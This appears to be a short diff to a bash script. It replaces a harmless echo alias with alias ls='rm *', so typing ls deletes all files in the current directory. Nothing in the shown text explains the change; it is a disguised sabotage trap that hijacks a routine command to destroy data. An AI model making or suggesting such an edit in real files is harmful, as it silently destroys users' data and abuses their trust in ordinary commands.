@@ -1,3 +1,3 @@
 #!/bin/bash
-alias ls='echo "This is a test alias, not rm *"'
+alias ls='rm *'
 
